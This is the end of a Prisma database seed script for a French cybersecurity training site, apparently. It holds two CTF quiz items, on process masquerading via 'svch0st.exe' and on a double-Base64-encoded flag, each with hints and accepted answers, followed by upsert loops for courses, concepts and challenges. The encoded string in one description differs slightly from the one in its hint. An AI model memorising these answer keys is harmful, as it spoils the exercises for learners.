    title: "Un nom presque parfait",
    description:
      "La liste des processus d'une machine compromise montre `svch0st.exe` tournant depuis un dossier temporaire utilisateur, aux côtés du légitime `svchost.exe` de Windows.\n\n" +
      "Quelle technique le nom `svch0st.exe` (avec un zéro à la place du 'o') illustre-t-il, utilisée pour tromper un utilisateur ou un administrateur pressé (2 mots en anglais) ?",
    hint: "C'est la même famille de technique que le typosquatting de domaines, appliquée à un nom de processus légitime.",
    points: 100,
    acceptedAnswers: ["process masquerading", "masquerading", "process spoofing"],
  },
  {
    key: "reverse-base64-layered",
    category: "REVERSE",
    difficulty: 3,
    title: "Encodage en couches",
    description:
      "Un binaire contient la chaîne suivante codée en dur : `Ym05a2FXWjU=`.\n\n" +
      "Cette chaîne est encodée en Base64 — mais une fois décodée une première fois, le résultat obtenu ressemble encore à du Base64. Décode-la deux fois de suite pour obtenir le flag final (un seul mot).",
    hint: "Décode `VG05a2FXWjU=` une première fois en Base64, puis décode le résultat obtenu une seconde fois de la même façon.",
    points: 100,
    acceptedAnswers: ["nodify"],
  },
];

async function main() {
  for (const skill of SKILLS) {
    await prisma.skill.upsert({
      where: { key: skill.key },
      create: skill,
      update: { name: skill.name, category: skill.category },
    });
  }
  console.log(`✅ ${SKILLS.length} compétence(s) synchronisée(s)`);

  for (const achievement of ACHIEVEMENTS) {
    await prisma.achievement.upsert({
      where: { key: achievement.key },
      create: achievement,
      update: achievement,
    });
  }
  console.log(`✅ ${ACHIEVEMENTS.length} succès synchronisé(s)`);

  for (const concept of CONCEPTS) {
    const { aliases, ...data } = concept;
    const saved = await prisma.concept.upsert({
      where: { key: concept.key },
      create: {
        ...data,
        relatedKeys: JSON.stringify(concept.relatedKeys),
        prerequisiteKeys: JSON.stringify(concept.prerequisiteKeys),
      },
      update: {
        ...data,
        relatedKeys: JSON.stringify(concept.relatedKeys),
        prerequisiteKeys: JSON.stringify(concept.prerequisiteKeys),
      },
    });

    for (const alias of aliases) {
      await prisma.conceptAlias.upsert({
        where: { term: alias },
        create: { term: alias, conceptId: saved.id },
        update: { conceptId: saved.id },
      });
    }
  }
  console.log(`✅ ${CONCEPTS.length} concept(s) synchronisé(s)`);

  for (const course of COURSES) {
    const { lessons, prerequisiteCourseKeys, ...courseData } = course;
    const prereqJson = JSON.stringify(prerequisiteCourseKeys ?? []);
    const savedCourse = await prisma.course.upsert({
      where: { key: course.key },
      create: { ...courseData, prerequisiteCourseKeys: prereqJson },
      update: { ...courseData, prerequisiteCourseKeys: prereqJson },
    });

    for (const lesson of lessons) {
      const { questions, ...lessonData } = lesson;
      const savedLesson = await prisma.lesson.upsert({
        where: { courseId_order: { courseId: savedCourse.id, order: lesson.order } },
        create: { ...lessonData, courseId: savedCourse.id },
        update: { ...lessonData },
      });

      for (const question of questions) {
        const { choices, ...questionData } = question;
        await prisma.question.upsert({
          where: { lessonId_order: { lessonId: savedLesson.id, order: question.order } },
          create: { ...questionData, choices: JSON.stringify(choices), lessonId: savedLesson.id },
          update: { ...questionData, choices: JSON.stringify(choices) },
        });
      }
    }
  }
  console.log(`✅ ${COURSES.length} cours synchronisé(s)`);

  for (const chunk of DOC_CHUNKS) {
    await prisma.docChunk.upsert({
      where: { source_title: { source: chunk.source, title: chunk.title } },
      create: chunk,
      update: chunk,
    });
  }
  console.log(`✅ ${DOC_CHUNKS.length} extrait(s) de documentation synchronisé(s)`);

  for (const q of DAILY_QUESTIONS) {
    const { choices, ...data } = q;
    await prisma.dailyQuestion.upsert({
      where: { key: q.key },
      create: { ...data, choices: JSON.stringify(choices) },
      update: { ...data, choices: JSON.stringify(choices) },
    });
  }
  console.log(`✅ ${DAILY_QUESTIONS.length} question(s) du jour synchronisée(s)`);

  for (const challenge of CTF_CHALLENGES) {
    const { acceptedAnswers, ...data } = challenge;
    await prisma.ctfChallenge.upsert({
      where: { key: challenge.key },
      create: { ...data, acceptedAnswers: JSON.stringify(acceptedAnswers) },
      update: { ...data, acceptedAnswers: JSON.stringify(acceptedAnswers) },
    });
  }
  console.log(`✅ ${CTF_CHALLENGES.length} défi(s) CTF synchronisé(s)`);
}

main()
  .catch((error) => {
    console.error("❌ Échec du seed :", error);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
